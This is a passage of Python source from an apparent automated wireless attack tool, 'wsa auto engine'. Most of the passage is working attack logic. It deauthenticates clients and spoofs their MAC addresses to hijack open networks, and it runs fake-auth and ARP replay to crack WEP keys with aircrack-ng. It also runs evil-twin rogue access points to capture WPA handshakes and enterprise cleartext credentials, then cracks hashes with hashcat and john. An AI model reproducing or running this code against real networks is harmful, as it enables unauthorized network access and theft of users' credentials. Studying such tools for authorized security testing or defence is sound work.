    # rogue is not a victim, and spoofing to our own MAC is a no-op
    own = set()
    for iface in (SPOOF(), MONITOR()):
        if not _valid_iface(iface):
            continue
        for getter in (current_mac, original_mac):
            try:
                m = getter(iface)
                if m:
                    own.add(m.upper())
            except Exception:
                pass
    try:
        with open(csv_file, errors="ignore") as f:
            in_station = False
            for row in csv.reader(f):
                if not row: continue
                if "Station MAC" in row[0]:
                    in_station = True; continue
                if in_station and len(row) >= 6:
                    mac   = row[0].strip().upper()
                    assoc = row[5].strip().upper()
                    if (assoc == bssid.upper() and mac
                            and not mac.startswith("FF:")
                            and mac != bssid.upper()
                            and mac not in own
                            and mac not in stations):
                        stations.append(mac)
    except Exception:
        pass
    return stations

def _station_poll(target):
    folder, bssid = target["folder"], target["bssid"]
    candidates = []
    try:
        for f in os.listdir(folder):
            if not f.endswith(".csv"): continue
            if f.startswith(("capture-", "target_airodump-", "wsa_station_detected")):
                full = os.path.join(folder, f)
                candidates.append((os.path.getmtime(full), full))
    except Exception:
        return []
    candidates.sort(reverse=True)
    for _, path in candidates:
        stations = _parse_stations(path, bssid)
        if stations: return stations
    return []

def _poll_mana_hash(folder):
    p = os.path.join(folder, "mana_hashes.txt")
    if not os.path.exists(p): return False
    try:
        with open(p, errors="ignore") as f:
            for line in f:
                if "WPA*02*" in line or "WPA*01*" in line: return True
    except Exception: pass
    return False

def _hash_count(folder):
    p = os.path.join(folder, "mana_hashes.txt")
    if not os.path.exists(p): return 0
    n = 0
    try:
        with open(p, errors="ignore") as f:
            for line in f:
                if "WPA*02*" in line or "WPA*01*" in line: n += 1
    except Exception: pass
    return n

def _poll_credentials(folder):
    p = os.path.join(folder, "credentials.txt")
    return os.path.exists(p) and os.path.getsize(p) > 0

def _credential_count(folder):
    """Count tagged credential lines in credentials.txt.
    Used by the enterprise grace extension to detect new material."""
    p = os.path.join(folder, "credentials.txt")
    if not os.path.exists(p):
        return 0
    n = 0
    try:
        with open(p, errors="ignore") as f:
            for line in f:
                if line.strip().startswith("["):
                    n += 1
    except Exception:
        pass
    return n

def _poll_iv_count(folder, bssid):
    try:
        files = sorted([f for f in os.listdir(folder) if f.startswith("capture-") and f.endswith(".csv")])
        if not files:
            files = sorted([f for f in os.listdir(folder) if f.startswith("target_airodump") and f.endswith(".csv")])
    except Exception: return 0
    if not files: return 0
    try:
        with open(os.path.join(folder, files[-1]), errors="ignore") as f:
            for row in csv.reader(f):
                if len(row) > 10 and row[0].strip().upper() == bssid.upper():
                    try:
                        v = int(row[10].strip())
                        if v >= 0: return v
                    except Exception: pass
    except Exception: pass
    return 0

def _write_station_csv(folder, stations):
    path = os.path.join(folder, "wsa_station_detected.csv")
    with open(path, "w") as f:
        f.write("# auto engine station snapshot\n")
        f.write("station_mac,seen,note\n")
        for mac in stations:
            f.write(f"{mac},live,detected during auto capture\n")
def _format_elapsed(seconds):
    mm, ss = divmod(int(seconds), 60)
    hh, mm = divmod(mm, 60)
    if hh: return f"{hh:d}:{mm:02d}:{ss:02d}"
    return f"{mm:02d}:{ss:02d}"

def _recovery_handoff(log=None):
    if log:
        log("blank", "")
        log("body", f"{WHT}recovery phase — closing worker panes{R}")
    _kill_worker_panes()
    time.sleep(0.5)

def _display_recovery_result(success, essid, bssid, method, fields, elapsed_seconds, log=None, force_red=False):
    clear()
    print()
    try:
        _tw = width()
    except Exception:
        _tw = 80
    W = min(76, max(50, _tw - 8))
    folder, _ = load_target()
    info = {}
    if folder:
        tf = os.path.join(folder, "target_info.txt")
        if os.path.exists(tf):
            try:
                for line in open(tf, errors="ignore"):
                    if ":" in line:
                        k, v = line.split(":", 1)
                        info[k.strip().lower()] = v.strip()
            except Exception: pass

    t_essid = info.get("essid", essid) or essid
    t_bssid = info.get("bssid", bssid) or bssid
    t_ch    = info.get("channel", "-") or "-"
    t_priv  = info.get("privacy", "-") or "-"
    t_ciph  = info.get("cipher", "")  or ""
    t_auth  = info.get("authentication", "-") or "-"
    t_sta   = info.get("station", "-") or "-"

    enc = t_priv
    # suppress redundant cipher when privacy and cipher are identical
    # (airodump writes "WEP" in both columns for WEP, "OPN" for open)
    if (t_ciph and t_ciph not in ("-", "")
            and t_ciph.upper() != t_priv.upper()):
        enc = f"{t_priv} ({t_ciph})"

    def _edge(pos):
        g = {"top": ("╔", "╗"), "mid": ("╠", "╣"), "bot": ("╚", "╝")}[pos]
        return f"   {LBL}{g[0]}{'═' * W}{g[1]}{R}"

    def _blank():
        return f"   {LBL}║{' ' * W}║{R}"

    def _row(content=""):
        vis = strip_ansi(content)
        pad = max(0, W - len(vis))
        return f"   {LBL}║{R}{content}{' ' * pad}{LBL}║{R}"

    def _kv(label, value, label_w=15):
        pad = " " * max(1, label_w - len(label))
        v = str(value)
        avail = W - 5 - max(label_w, len(label))
        if len(v) > avail: v = v[:max(0, avail - 1)] + "…"
        return f"     {WHT}{label}{pad}{R}{VAL}{v}{R}"

    def _section(title):
        return f"   {WHT}{title}{R}"

    accent = ERR if force_red else (RDY if success else ERR)
    _m_low = (method or "").lower()
    if success and "cleartext" in _m_low:
        headline = "TTLS CLEARTEXT  ·  CREDENTIALS CAPTURED"
        hmark_l = "██"; hmark_r = "██"
    elif success:
        headline = "ACCESS COMPROMISED"
        hmark_l = "▶▶"; hmark_r = "◀◀"
    else:
        headline = "ACCESS NOT COMPROMISED"
        hmark_l = "✗ "; hmark_r = " ✗"
    now = time.strftime("%Y-%m-%d  ·  %H:%M")

    print(_edge("top"))
    print(_blank())
    print(_row(f"   {CNR}C L A S S I F I E D{R}"))
    print(_blank())
    print(_row(f"        {WHT}wsa auto engine  ·  v{VERSION}{R}"))
    print(_row(f"        {DIM}{now}{R}"))
    print(_blank())
    print(_edge("mid"))
    print(_blank())
    # plain left-aligned headline, aligned to section headers
    print(_row(f"   {accent}{headline}{R}"))
    print(_blank())
    print(_edge("mid"))
    print(_blank())
    print(_row(_section("TARGET INTELLIGENCE")))
    print(_row(_kv("ESSID",       t_essid)))
    print(_row(_kv("BSSID",       t_bssid)))
    print(_row(_kv("CHANNEL",     t_ch)))
    print(_row(_kv("ENCRYPTION",  enc)))
    print(_row(_kv("AUTH",        t_auth)))
    print(_row(_kv("STATION",     t_sta)))
    print(_blank())
    print(_edge("mid"))
    print(_blank())
    print(_row(_section("RECOVERED MATERIAL")))
    for label, value in fields:
        print(_row(_kv(label.upper(), str(value))))
    print(_row(_kv("METHOD",  method)))
    print(_row(_kv("ELAPSED", _format_elapsed(elapsed_seconds))))
    print(_blank())
    print(_edge("bot"))
    print()
    if not success:
        _m_nc = (method or "").lower()
        if "no client" in _m_nc or "aborted" in _m_nc:
            print(f"       {WHT}no client activity detected on the target{R}")
            print(f"       {DIM}the flow aborted after the configured cycle cap{R}")
            print(f"       {DIM}verify before re-running:{R}")
            print(f"       {DIM}  · recon STA column showed >= 1 before selection{R}")
            print(f"       {DIM}  · client has auto-connect enabled for the SSID{R}")
            print()
            sys.stdout.flush()
            return
        elif "aircrack" in _m_nc or _m_nc.startswith("wep"):
            print(f"       {WHT}WEP key not recovered from current capture{R}")
            print(f"       {DIM}recommended next steps:{R}")
            print(f"       {DIM}  - re-run capture for longer to reach >= 50,000 IVs{R}")
            print(f"       {DIM}  - force ARP replay to accelerate IV collection{R}")
            print(f"       {DIM}  - verify capture-*.cap is present (replay_arp alone not enough){R}")
            print()
            sys.stdout.flush()
            try:
                input(f"   {LBL}press ENTER to return to target menu{R} ")
            except (KeyboardInterrupt, EOFError):
                print()
            return
        else:
            print(f"       {WHT}captured material retained for follow-up analysis{R}")
        print(f"       {DIM}consider alternative strategies:{R}")
        print(f"       {DIM}  · extended wordlist · targeted mask{R}")
        print(f"       {DIM}  · alternate recovery tool · offline review{R}")
        print()
    sys.stdout.flush()

    # card holds for Enter in auto mode — operator reads and acknowledges,
    # then flow continues to report + main menu (no auto-dismiss)
    try:
        input(f"   {LBL}press ENTER to acknowledge ▸{R} ")
    except (KeyboardInterrupt, EOFError):
        print()
        print(f"   {LBL}acknowledged via Ctrl+C — running wrapup{R}")

def _enterprise_check_cleartext(folder):
    creds = os.path.join(folder, "credentials.txt")
    if not os.path.exists(creds): return []
    def _extract(payload):
        kvu = dict(re.findall(r"(\w+)\s*=\s*([^\s]+)", payload))
        if kvu:
            user = (kvu.get("user") or kvu.get("username") or kvu.get("identity") or "").strip()
            pwd  = (kvu.get("password") or kvu.get("pass") or kvu.get("pwd") or "").strip()
            if user and pwd: return user, pwd
        if "|" in payload:
            parts = [p.strip() for p in payload.split("|")]
            if len(parts) >= 2 and parts[0] and parts[1]: return parts[0], parts[1]
        if ":" in payload and "=" not in payload:
            parts = [p.strip() for p in payload.split(":")]
            if len(parts) >= 2 and parts[0] and parts[1]: return parts[0], parts[1]
        return None
    out = []
    try:
        for line in open(creds, errors="ignore"):
            line = line.strip()
            if not line or not line.startswith("["): continue
            close = line.find("]")
            if close < 0: continue
            tag     = line[1:close].strip().upper().replace("_", "-")
            payload = line[close + 1:].strip()
            if not payload: continue
            if "PAP" not in tag and "CLEAR" not in tag: continue
            pair = _extract(payload)
            if pair and pair not in out: out.append(pair)
    except Exception: return []
    return out

def _enterprise_extract_username(folder):
    for path in sorted(glob.glob(os.path.join(folder, "*hc5500.txt.recovered"))):
        if not os.path.exists(path) or os.path.getsize(path) == 0: continue
        try:
            with open(path, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or ":" not in line: continue
                    user = line.split(":", 1)[0].strip()
                    if user: return user
        except Exception: pass
    return None
def _run_john_in_conductor(target, log):
    folder = target["folder"]
    if not shutil.which("john"): return False, "john not installed"
    hash_file = os.path.join(folder, "hashes_jtr.txt")
    if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
        return False, "no jtr hash file to crack"
    mask     = (CFG.get("default_mask") or "").strip()
    wordlist = _wordlist_path()
    use_mask = bool(mask) and mask not in ("", "0") and _mask_valid(mask)
    if not use_mask and not wordlist: return False, "no wordlist or mask configured"
    pot = f"/tmp/wsa_john_{os.getpid()}_{int(time.time())}.pot"
    try: os.remove(pot)
    except Exception: pass
    _status_clear()
    clear(); print(rule("wsa"))
    print(f"       {WHT}ANALYSIS  ·  john --format=netntlm{R}")
    print(f"       {WHT}hash      {os.path.basename(hash_file)}{R}")
    if use_mask: print(f"       {WHT}mask      {mask}{R}")
    else:        print(f"       {WHT}wordlist  {os.path.basename(wordlist)}{R}")
    print(f"\n       {LBL}john running — fresh run, stops at first crack{R}\n")
    sys.stdout.flush()
    if use_mask: cmd = ["john", "--format=netntlm", f"--mask={mask}", f"--pot={pot}", hash_file]
    else:        cmd = ["john", "--format=netntlm", f"--wordlist={wordlist}", f"--pot={pot}", hash_file]
    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None: signal.signal(signal.SIGINT, old_handler[0]); raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass
    _watch_stop = threading.Event()
    def _watch_pot():
        time.sleep(0.5)
        while not _watch_stop.is_set():
            try:
                if os.path.exists(pot) and os.path.getsize(pot) > 0:
                    p = proc_holder.get("proc")
                    if p and p.poll() is None:
                        _status_write("credential recovered · stopping john")
                        try: p.send_signal(signal.SIGINT)
                        except Exception: pass
                    time.sleep(0.5); _watch_stop.set(); return
            except Exception: pass
            time.sleep(0.5)
    threading.Thread(target=_watch_pot, daemon=True).start()
    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(cmd); proc_holder["proc"] = proc; proc.wait()
    except Exception: pass
    finally: _watch_stop.set(); signal.signal(signal.SIGINT, old_handler[0])
    passphrase = None
    if os.path.exists(pot):
        try:
            with open(pot, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line:
                        passphrase = line.rsplit(":", 1)[-1].strip(); break
        except Exception: pass
    try: os.remove(pot)
    except Exception: pass
    print(f"\n       {LBL}{'─' * 60}{R}")
    if passphrase: print(f"       {RDY}RECOVERED{R}  {WHT}{passphrase}{R}")
    else:          print(f"       {VAL}not recovered{R}")
    print(f"       {LBL}{'─' * 60}{R}\n")
    sys.stdout.flush()
    _hold_briefly(5, "continuing")
    return (passphrase, "john") if passphrase else (False, "")

def _run_hashcat_in_conductor(target, log, mode):
    folder = target["folder"]
    if not shutil.which("hashcat"): return False, "hashcat not installed"
    if mode == 22000: candidates = [os.path.join(folder, "mana_hashes.hc22000"), os.path.join(folder, "mana_hashes_all.hc22000")]
    else:             candidates = [os.path.join(folder, "hashes_hc5500.txt")]
    hash_file = None
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 0: hash_file = c; break
    if not hash_file: return False, "no hash file to crack"
    mask     = (CFG.get("default_mask") or "").strip()
    wordlist = _wordlist_path()
    use_mask = bool(mask) and mask not in ("", "0") and _mask_valid(mask)
    if not use_mask and not wordlist: return False, "no wordlist or mask configured"
    recovered = f"{hash_file}.recovered"
    try: os.remove(recovered)
    except Exception: pass
    _status_clear()
    clear(); print(rule("wsa"))
    print(f"       {WHT}ANALYSIS  ·  hashcat -m {mode}{R}")
    print(f"       {WHT}hash      {os.path.basename(hash_file)}{R}")
    if use_mask: print(f"       {WHT}mask      {mask}{R}")
    else:        print(f"       {WHT}wordlist  {os.path.basename(wordlist)}{R}")
    print(f"\n       {LBL}hashcat running — fresh run, stops at first crack{R}\n")
    sys.stdout.flush()
    safe_flags = _hashcat_safe_flags(mode)
    if use_mask:
        cmd = ["hashcat", "-m", str(mode), hash_file, "-a", "3", mask,
               "-w", "4", "--status", "--status-timer=10",
               "-o", recovered, "--potfile-disable"] + safe_flags
    else:
        cmd = ["hashcat", "-m", str(mode), hash_file, wordlist,
               "-w", "4", "--nonce-error-corrections=8",
               "--status", "--status-timer=10",
               "-o", recovered, "--potfile-disable"] + safe_flags
    proc_holder = {"proc": None}
    old_handler = [None]
    def _sigint(s, f):
        p = proc_holder.get("proc")
        if p is None: signal.signal(signal.SIGINT, old_handler[0]); raise KeyboardInterrupt
        if p.poll() is None:
            try: p.send_signal(signal.SIGINT)
            except Exception: pass
    _watch_stop = threading.Event()
    def _watch_recovered():
        time.sleep(0.3)
        while not _watch_stop.is_set():
            try:
                if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
                    p = proc_holder.get("proc")
                    if p and p.poll() is None:
                        _status_write("password recovered · stopping hashcat")
                        try: p.send_signal(signal.SIGINT)
                        except Exception: pass
                    time.sleep(0.5); _watch_stop.set(); return
            except Exception: pass
            time.sleep(0.3)
    threading.Thread(target=_watch_recovered, daemon=True).start()
    old_handler[0] = signal.signal(signal.SIGINT, _sigint)
    try:
        proc = subprocess.Popen(cmd); proc_holder["proc"] = proc; proc.wait()
    except Exception: pass
    finally: _watch_stop.set(); signal.signal(signal.SIGINT, old_handler[0])
    passphrase = None
    if os.path.exists(recovered) and os.path.getsize(recovered) > 0:
        try:
            with open(recovered) as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line:
                        passphrase = line.rsplit(":", 1)[-1].strip(); break
        except Exception: pass
    print(f"\n       {LBL}{'─' * 60}{R}")
    if passphrase: print(f"       {RDY}RECOVERED{R}  {WHT}{passphrase}{R}")
    else:          print(f"       {VAL}not recovered{R}")
    print(f"       {LBL}{'─' * 60}{R}\n")
    sys.stdout.flush()
    _hold_briefly(5, "continuing")
    return (passphrase, "hashcat") if passphrase else (False, "")

def _ping_count(pane):
    out = _capture_pane(pane, 400)
    return out.count("64 bytes from")
def open_flow_auto(target, panes):
    flow = "OPEN"
    _flow_start_time = time.time()
    log, _ = _flow_header(target, flow, _flow_steps(flow)["steps"])
    if "capture" in panes:
        _pane_send(panes["capture"], "1", "Enter")
        time.sleep(0.8)
    for needed in ("capture", "mac", "ping", "deauth"):
        if needed not in panes:
            log("fail", f"worker pane missing: {needed}")
            log("body", f"{ERR}cannot run flow without all workers{R}")
            _hold_until_enter(); return False
    station, _cycles = _wait_for_station(target, log, panes.get("deauth"))
    if station is None:
        _display_recovery_result(
            success=False,
            essid=target["essid"],
            bssid=target["bssid"],
            method="no client capture",
            fields=[
                ("reason",  f"no station after {_cycles} cycles"),
                ("timeout", f"{_cycles * THR('station_timeout')}s"),
            ],
            elapsed_seconds=time.time() - _flow_start_time,
            log=log,
        )
        _flow_wrapup(target, flow, log)
        return False
    _show_step(log, flow, 1, body_lines=[f"station detected  ·  {station}"])
    _show_event(log, "station seen · conductor advances")
    _write_station_csv(target["folder"], [station])

    # Pre-spoof hygiene — restore wlan0 to hardware MAC and force
    # NM to a clean state before spoofing.  Prevents a stale cloned
    # MAC from the previous run poisoning the re-association after
    # spoof.  Idempotent: no-op when wlan0 already has hardware MAC.
    _reset_spoof_mac()
    log("status", "wlan0 reset to hardware MAC · NM clean")

    original = original_mac(SPOOF())
    spoof_ok = False; current  = None
    for attempt in range(1, 4):
        _pane_send(panes["mac"], "2", "Enter")
        if not _wait_for_worker_ready(panes["mac"], "targets", timeout=8):
            _wait_for_worker_ready(panes["mac"], "wait for a station", timeout=3)
        _pane_send(panes["mac"], "1", "Enter")
        result = _wait_with_countdown(f"applying MAC  ·  attempt {attempt}", timeout=45, condition_fn=lambda: (current_mac(SPOOF()) == station.upper()))
        current = current_mac(SPOOF())
        if result and current == station.upper(): spoof_ok = True; break
        if attempt < 3:
            _sudo(["ip", "link", "set", SPOOF(), "down"]); time.sleep(1)
            _sudo(["ip", "link", "set", SPOOF(), "up"]); time.sleep(3)
    current = current_mac(SPOOF())
    _show_step(log, flow, 2, body_lines=[f"original   ·  {original or '(unknown)'}", f"spoofed    ·  {current or '(unknown)'}"])
    _show_event(log, "MAC matches · conductor advances")
    if not spoof_ok:
        log("body", f"{ERR}spoof failed · adapter still {current}{R}")
        _flow_wrapup(target, flow, log); return False
    log("status", "restarting NetworkManager for MAC re-association")
    if not _nm_reassociate(SPOOF(), log=log, timeout=45):
        log("warn", "NM did not report connected")
    # explicit connect: NM restart only auto-associates when a saved
    # profile exists for the SSID — fresh targets have none.
    _essid = target.get("essid", "")
    if _essid and not _connect_to_essid(SPOOF(), _essid, timeout=25):
        log("warn", f"explicit connect to {_essid} failed")

    # Step 3 · DEAUTH BEFORE PING
    # When wlan0 spoofs the client MAC, the real client is still
    # associated to the real AP.  The AP refuses (or silently
    # ignores) the new association from the "same" MAC while the
    # original session is active.  Deauthing first frees the MAC
    # slot, so the spoofed wlan0 can associate and obtain a DHCP
    # lease.  Matches the manual procedure order.
    _show_step(log, flow, 3, body_lines=[
        "deauth target station to free the MAC slot",
        "real client should drop, then wlan0 claims it",
    ])
    _show_event(log, "deauth dispatched · conductor advances to ping")
    _pane_send(panes["deauth"], "2", "Enter"); time.sleep(1.8)
    _pane_send(panes["deauth"], "1", "Enter")
    log("status", "waiting 10s for real client to drop")
    for remaining in range(10, 0, -1):
        _status_write(f"settling  ·  00:{remaining:02d}"); time.sleep(1)
    _status_clear()

    # Step 4 · connectivity test with spoofed MAC.
    # Ping-8.8.8.8 alone produces false negatives on guest APs that
    # block ICMP but permit HTTP.  The multi-layer test distinguishes
    # "not associated" from "associated, ICMP blocked" — both appear
    # as 100% packet loss to a naive ping.
    log("status", "waiting 5s for DHCP lease")
    for remaining in range(5, 0, -1):
        _status_write(f"settling  ·  00:{remaining:02d}"); time.sleep(1)
    _status_clear()
    _status_write("connectivity test  ·  running")
    _conn = _test_connectivity(SPOOF())
    _status_clear()
    internet_ok = bool(_conn["http_ok"] or _conn["internet_icmp"]
                       or _conn["local_icmp"])
    if internet_ok and _conn["http_ok"] and not _conn["internet_icmp"]:
        _verdict = "reachable via HTTP (ICMP blocked)"
    elif internet_ok:
        _verdict = "reachable"
    elif _conn["ip"]:
        _verdict = "associated, no internet"
    else:
        _verdict = "not associated"
    _show_step(log, flow, 4, body_lines=[
        f"IP: {_conn['ip'] or 'none'}",
        f"gw: {_conn['gw'] or 'none'}",
        f"icmp: local={'Y' if _conn['local_icmp'] else 'N'}  "
        f"internet={'Y' if _conn['internet_icmp'] else 'N'}  "
        f"http={'Y' if _conn['http_ok'] else 'N'}",
        f"verdict: {_verdict}",
    ])
    _show_event(log, f"connectivity test  ·  {_verdict}")
    save_station(target["folder"], station)
    with open(os.path.join(target["folder"], "target_info.txt"), "a") as f:
        f.write(f"PING_RESULT:       {'yes' if internet_ok else 'no'}\n")
        f.write(f"PING_MAC:          {station}\n")
        f.write(f"REASSOCIATED:      {'yes' if _conn['ip'] else 'no'}\n")
        f.write(f"CONNECTION_IP:     {_conn['ip'] or 'none'}\n")
        f.write(f"CONNECTION_GW:     {_conn['gw'] or 'none'}\n")
        f.write(f"CONNECTION_HTTP:   {'yes' if _conn['http_ok'] else 'no'}\n")
        f.write(f"CONNECTION_ICMP:   {'yes' if _conn['internet_icmp'] else 'no'}\n")
        f.write(f"CONNECTION_VERDICT:{_verdict}\n")
    _recovery_handoff(log)
    _display_recovery_result(success=internet_ok, essid=target["essid"], bssid=target["bssid"], method=f"MAC spoof + connectivity test ({_verdict})", fields=[("spoofed", current or "(unknown)"), ("ip", _conn["ip"] or "none"), ("http", "yes" if _conn["http_ok"] else "no"), ("icmp-8.8.8.8", "yes" if _conn["internet_icmp"] else "no")], elapsed_seconds=time.time() - _flow_start_time, log=log)
    _flow_wrapup(target, flow, log)
    return internet_ok

def wep_flow_auto(target, panes):
    flow = "WEP"
    log, _ = _flow_header(target, flow, _flow_steps(flow)["steps"])
    if "capture" in panes:
        _pane_send(panes["capture"], "1", "Enter")
        time.sleep(0.8)
    for needed in ("capture", "fakeauth", "arpreplay", "deauth"):
        if needed not in panes:
            log("fail", f"worker pane missing: {needed}"); _hold_until_enter(); return False
    _flow_start_time = time.time()
    station, _cycles = _wait_for_station(target, log, panes.get("deauth"))
    if station is None:
        _display_recovery_result(
            success=False,
            essid=target["essid"],
            bssid=target["bssid"],
            method="no client capture",
            fields=[
                ("reason",  f"no station after {_cycles} cycles"),
                ("timeout", f"{_cycles * THR('station_timeout')}s"),
            ],
            elapsed_seconds=time.time() - _flow_start_time,
            log=log,
        )
        _flow_wrapup(target, flow, log)
        return False
    _show_step(log, flow, 1, body_lines=[f"station detected  ·  {station}"]); _show_event(log, "station seen · conductor advances")
    _pane_send(panes["fakeauth"], "1", "Enter"); time.sleep(8)
    fa_out = _capture_pane(panes["fakeauth"], 100).lower()
    associated = ("successful" in fa_out or "associated" in fa_out or "authenticated" in fa_out)
    _show_step(log, flow, 2, body_lines=["fake auth sent", "associated  ·  AP accepted" if associated else "not associated  ·  AP rejected"])
    _show_event(log, "associated · conductor advances" if associated else "not associated · conductor switches to 3'")
    if associated: source = "local MAC"; _pane_send(panes["arpreplay"], "1", "Enter")
    else: source = f"station {station}"; _pane_send(panes["arpreplay"], "2", "Enter"); time.sleep(1.5); _pane_send(panes["arpreplay"], "1", "Enter")
    time.sleep(5)
    _show_step(log, flow, 3, body_lines=[f"replay running  ·  source {source}"]); _show_event(log, "replay running · conductor advances")
    iv_threshold = THR("iv_threshold"); start = time.time(); last_count = 0; iv_count = 0
    FIRST_STIMULUS_DELAY = THR("wep_first_stimulus_delay")
    STIMULUS_INTERVAL    = THR("wep_stimulus_interval")
    next_stimulus        = start + FIRST_STIMULUS_DELAY
    log("action", f"deauth stimulus every {STIMULUS_INTERVAL}s during IV harvest")
    while True:
        elapsed  = int(time.time() - start)
        iv_count = _poll_iv_count(target["folder"], target["bssid"])
        _status_write(f"IVs: {iv_count:,} / {iv_threshold:,}  ·  {elapsed}s")
        if iv_count >= iv_threshold: _status_clear(); break
        now = time.time()
        if "deauth" in panes and now >= next_stimulus: _pane_send(panes["deauth"], "3", "Enter"); next_stimulus = now + STIMULUS_INTERVAL
        if iv_count > last_count: last_count = iv_count
        if elapsed > 900: _status_clear(); break
        time.sleep(3)
    _show_step(log, flow, 4, body_lines=[f"collecting  ·  {iv_count:,} / {iv_threshold:,}", f"{iv_threshold:,} reached" if iv_count >= iv_threshold else "harvest timeout"])
    _show_event(log, "threshold met · conductor advances")
    _sudo(["pkill", "-TERM", "-f", f"airodump-ng.*{MONITOR()}"], timeout=5); time.sleep(1.5)
    _show_event(log, "IV threshold met · entering recovery phase")

    if _AUTO_CAPTURE_ONLY:
        _show_step(log, flow, 5, body_lines=[
            "capture only  ·  no recovery strategy configured"])
        print()
        print(f"       {RDY}►{R}  capture complete  ·  {iv_count:,} IVs collected")
        print(f"       {DIM}recovery available later from the analysis console{R}")
        print()
        sys.stdout.flush()
        _flow_wrapup(target, flow, log)
        return True

    _recovery_handoff(log); t_recovery = time.time()
    all_caps = [f for f in os.listdir(target["folder"]) if f.endswith(".cap")]
    # prefer the airodump capture; replay_arp-*.cap holds ARP frames only
    cap_files = [f for f in all_caps if f.startswith("capture-")] or all_caps
    key = None
    if not cap_files:
        log("warn", "no capture-*.cap — aircrack-ng skipped")
        log("body", f"{DIM}capture worker wrote csv only; aircrack-ng needs pcap{R}")
    if cap_files:
        largest  = max(cap_files, key=lambda f: os.path.getsize(os.path.join(target["folder"], f)))
        cap_path = os.path.join(target["folder"], largest)
        result   = _sudo(["aircrack-ng", "-a", "1", cap_path], timeout=90, quiet=False)
        stdout   = result.stdout if result else ""
        m = re.search(r'KEY FOUND!\s*\[(.*?)\]', stdout, re.IGNORECASE)
        if m: key = m.group(1).strip(); open(os.path.join(target["folder"], "key.txt"), "w").write(f"WEP KEY: {key}\n")
    elapsed = time.time() - t_recovery
    if key:
        _show_step(log, flow, 5, body_lines=[f"aircrack-ng  ·  {cap_files[0] if cap_files else '(none)'}", f"key  ·  {key}"])
        _display_recovery_result(success=True, essid=target["essid"], bssid=target["bssid"], method="aircrack-ng -a 1", fields=[("wep key", key)], elapsed_seconds=elapsed, log=log)
    else:
        _show_step(log, flow, 5, body_lines=[f"aircrack-ng  ·  {cap_files[0] if cap_files else '(none)'}", "key not recovered  ·  insufficient IVs"])
        _display_recovery_result(success=False, essid=target["essid"], bssid=target["bssid"], method="aircrack-ng -a 1", fields=[("ivs harvested", f"{iv_count:,}"), ("capture file",  cap_files[0] if cap_files else "(none)")], elapsed_seconds=elapsed, log=log)
    _flow_wrapup(target, flow, log); return True

def _sweep_gen(tc):
    def wrap(ch): return ((ch - 1) % 13) + 1
    n = 0
    while True:
        n += 1; yield (n, "same", str(tc))
        n += 1; offset = n // 2
        ch = wrap(tc + offset)
        if ch == tc: ch = wrap(tc + offset + 1)
        yield (n, f"next+{offset}", str(ch))

def _evil_twin_flow(target, panes, flow, ap_type, check_fn, check_label, hashcat_mode):
    log, _ = _flow_header(target, flow, _flow_steps(flow)["steps"])
    if "evil_twin" not in panes:
        log("fail", "worker pane missing: evil_twin"); _hold_until_enter(); return False
    if MONITOR() == AP(): _stop_capture_processes()
    _sweep_start = time.time()
    _max_rounds  = THR("rogue_max_rounds")
    tc = 0
    try: tc = int(target["channel"])
    except: tc = 6
    captured = False; round_num = 0; body_lines = []; grace = THR("rogue_retransmit_window")
    _round_window = (THR("rogue_enterprise_window") if flow == "ENTERPRISE"
                     else THR("rogue_round_window"))
    for round_num, label, channel in _sweep_gen(tc):
        if round_num > _max_rounds:
            log("status", f"reached {_max_rounds} sessions without capture · aborting")
            round_num = _max_rounds   # clamp for display
            break
        if not _write_evil_twin_conf(target, channel, ap_type): continue
        time.sleep(0.5)
        ctx = f"  ·  session {round_num}  ·  CH {channel}"
        if not _activate_evil_twin(panes["evil_twin"], log, iface=AP(), context=ctx, target_bssid=target["bssid"]): continue
        got = _wait_with_countdown(f"session {round_num}  ·  {label}  ·  CH {channel}", timeout=_round_window, condition_fn=lambda: (check_fn(target["folder"]) or None))
        if not got and check_fn(target["folder"]):
            # second chance — material appeared at timeout boundary
            got = True
        if got and grace > 0:
            count_fn = _credential_count if flow == "ENTERPRISE" else _hash_count
            initial = count_fn(target["folder"])
            running = initial
            log("status", f"material seen · listening {grace}s more")
            deadline = time.time() + grace
            while time.time() < deadline:
                now = count_fn(target["folder"])
                if now > running:
                    running = now
                    deadline = time.time() + grace  # extend on new material
                left = int(deadline - time.time())
                _status_write(f"collecting  ·  {left:02d}s")
                time.sleep(1)
            _status_clear()
            final = count_fn(target["folder"])
            log("status", f"collected {final - initial} additional")
        _sudo(["pkill", "-TERM", "-f", "hostapd"], timeout=5)
        _sudo(["pkill", "-TERM", "-f", f"airodump-ng.*{AP()}"], timeout=5)
        _sudo(["pkill", "-TERM", "-f", f"aireplay-ng.*{AP()}"], timeout=5)
        time.sleep(0.8); _wait_for_worker_ready(panes["evil_twin"], "activate rogue AP", timeout=8)
        if got: captured = True; body_lines = [f"session {round_num}  ·  {label}  ·  CH {channel}", "hostapd up", check_label]; break
        body_lines = [f"session {round_num}  ·  {label}  ·  CH {channel}", "no material"]
    _show_step(log, flow, 1, body_lines=body_lines); _show_event(log, "material seen · conductor advances")
    time.sleep(5)
    folder = target["folder"]
    found  = [fname for fname in ["mana_hashes.hc22000", "mana_hashes_all.hc22000", "hashes_hc5500.txt", "hashes_jtr.txt", "credentials.txt"] if os.path.exists(os.path.join(folder, fname)) and os.path.getsize(os.path.join(folder, fname)) > 0]
    _show_step(log, flow, 2, body_lines=found or ["no artifacts"]); _show_event(log, "artifact present · conductor advances")
    if not captured or not found:
        _show_step(log, flow, 3, body_lines=["skipped  ·  nothing to crack"])
        _display_recovery_result(
            success=False,
            essid=target["essid"],
            bssid=target["bssid"],
            method="no client capture",
            fields=[
                ("reason", "no handshake or credentials appeared"),
                ("sessions", f"{round_num} / {_max_rounds}"),
            ],
            elapsed_seconds=time.time() - _sweep_start,
            log=log,
        )
        _flow_wrapup(target, flow, log)
        return captured
    _show_event(log, "material present · entering recovery phase")

    if _AUTO_CAPTURE_ONLY:
        _show_step(log, flow, 3, body_lines=[
            "capture only  ·  no recovery strategy configured"])
